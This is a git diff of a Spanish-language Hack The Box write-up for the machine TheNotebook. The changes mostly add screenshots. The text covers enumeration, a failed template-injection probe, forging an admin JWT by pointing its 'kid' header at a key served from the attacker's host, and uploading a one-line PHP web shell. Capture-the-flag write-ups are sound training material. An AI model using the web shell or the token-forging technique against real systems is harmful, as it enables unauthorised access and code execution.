@@ -1,4 +1,6 @@
 # 10.10.10.230 - TheNotebook
+![TheNotebook](https://user-images.githubusercontent.com/96772264/210067909-9ac7aa08-9292-43dc-91c8-f3dbac73a4ca.png)
+
 ----------------------------
 
 # Part 1: Enumeracion básica
@@ -21,11 +23,14 @@ Bootstrap, HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], Title[The Not
 
 La web es muy simple, apenas tiene tiene una pestaña de login y otra de register. La seccion /admin da un 403 
 unauthorized obviamente.
+![notebook1](https://user-images.githubusercontent.com/96772264/210067980-124224ff-bda1-48ef-876c-5b0a60ceefa9.PNG)
 
 Cuando nos registramos ```POST a /register -> cucuxii:cucuxii:cucuxii@htb.htb```
 Una vez registrados hay una seccion /Notes
+![notebook2](https://user-images.githubusercontent.com/96772264/210068001-637d6b84-a2e9-423d-9c46-767e88a75285.PNG)
 
-Intento crear una nota con un payload STTI {{4*4}} por titulo y contenido pero no lo interpreta.
+Intento crear una nota con un payload STTI {{4\*4}} por titulo y contenido pero no lo interpreta.
+![notebook3](https://user-images.githubusercontent.com/96772264/210068016-a82f05e6-8f23-4808-b554-b3708ed4bd55.PNG)
 
 En la url pone ```http://10.10.10.230/6e1ed97a-2a06-4e7b-84a3-047e03fc347f/notes/5``` si en vez de 5 ponemos otro
 numero nos da unauthorized. Intento poner una comilla tras el numero para causar un error sql pero tambien 
@@ -66,6 +71,7 @@ Lo que queda es copiarla, crear una jwt con ella en jwt.io:
 - La llave va en el campo private key
 - Cambiamos lo de *admin_cap* a 1
 - La servimos desde neustro sistema -> ```sudo python3 -m http.server 80``` por tanto ```"kid": "http://10.10.14.16/llave.key"```
+![notebook4](https://user-images.githubusercontent.com/96772264/210068047-5ad8fe96-ae7c-4f92-8e8b-2d869276e106.PNG)
 
 Ya con eso tenemos el admin_panel
 
@@ -80,9 +86,10 @@ Esto puede ser un riesgo potencial para el servidor.
 3. Frases del Diario de Noa (noah) -> Una diálogo de la película...
 4. Están mis datos a salvo? (noah) -> Me pregunto si el administrador es lo suficiente bueno para confiar en él
 ```
+![notebook5](https://user-images.githubusercontent.com/96772264/210068053-6ce55675-e538-4e67-9c2a-da2e6a165a60.PNG)
 
 Si subimos en uploads un shell.php con este contenido...
-```<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>```
+```<?php system($_REQUEST['cmd']); ?>```
 
 Nos dan la ruta c214a2fb80bab315fc328a5eff2892b5.php (hace un md5)
 ```console
